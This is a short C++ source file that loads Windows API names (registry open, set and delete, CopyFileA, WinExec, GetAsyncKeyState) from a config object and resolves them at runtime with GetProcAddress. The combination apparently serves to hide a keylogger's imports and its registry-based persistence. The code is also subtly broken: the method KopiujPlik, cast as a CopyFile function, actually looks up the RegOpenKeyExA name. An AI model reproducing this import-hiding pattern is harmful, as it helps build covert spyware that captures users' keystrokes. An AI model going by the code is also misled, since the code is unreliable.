#include "newwinapi.h"

newWinApi::newWinApi()
{
    Config *config = new Config();

    this->advapi32Libray = config->StringToLPCTSTR(config->GetAdvapi32Libray());
    this->kernel32Libray = config->StringToLPCTSTR(config->GetKernel32Libray());
    this->user32Libray = config->StringToLPCTSTR(config->GetUser32Libray());

    this->CopyFileAFunction = config->StringToLPCTSTR(config->GetCopyFileAFunction());
    this->RegOpenKeyExFunction = config->StringToLPCTSTR(config->GetRegOpenKeyExAFunction());
    this->RegSetValueExAFunction = config->StringToLPCTSTR(config->GetRegSetValueExAFunction());
    this->RegCloseKeyFunction = config->StringToLPCTSTR(config->GetRegCloseKeyFunction());
    this->RegDeleteVauleFunction = config->StringToLPCTSTR(config->GetRegDeleteValueFunction());
    this->WinExecFunction = config->StringToLPCTSTR(config->GetWinExecFunction());
    this->AsyncKeyStateFunction = config->StringToLPCTSTR(config->GetAsyncKeyStateFunction());
}

_CopyFile newWinApi::KopiujPlik(){
    return (_CopyFile) GetProcAddress(GetModuleHandle(this->GetKernel32Libray()), this->GetRegOpenKeyExAFunction());
}
